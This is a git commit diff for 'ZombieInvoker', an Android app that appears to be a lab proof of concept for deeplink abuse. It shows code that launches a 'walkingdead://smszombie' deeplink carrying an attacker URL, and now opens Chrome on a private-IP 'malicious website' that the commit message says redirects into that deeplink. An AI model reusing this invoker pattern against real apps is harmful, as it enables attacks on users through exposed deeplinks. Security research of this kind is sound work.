58d2ee07acf889f74f488b45a388265b3fb9ba6a
Manwel Bugeja <manwelbugeja@Manwels-MacBook-Pro-2.local>
2022-11-30 16:48:21 +0100

    added chrome-based deeplingk invocation made malicious website automatically redirect

--- ZombieInvoker/app/src/main/java/com/example/zombieinvoker/MainActivity.java
+++ ZombieInvoker/app/src/main/java/com/example/zombieinvoker/MainActivity.java
@@ -2,6 +2,7 @@ package com.example.zombieinvoker;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.content.ActivityNotFoundException;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
@@ -13,9 +14,20 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        Intent viewIntent =
-                new Intent("android.intent.action.VIEW",
-                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
-        startActivity(viewIntent);
+        // Redirect to deeplink via intent
+//        Intent viewIntent =
+//                new Intent("android.intent.action.VIEW",
+//                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
+//        startActivity(viewIntent);
+
+        // Redirect to deeplink via chrome
+        String urlString = "http://192.168.1.134:1312";
+        Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse(urlString));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.setPackage("com.android.chrome");
+        try {
+            startActivity(intent);
+        } catch (ActivityNotFoundException ignored) {
+        }
     }
 }
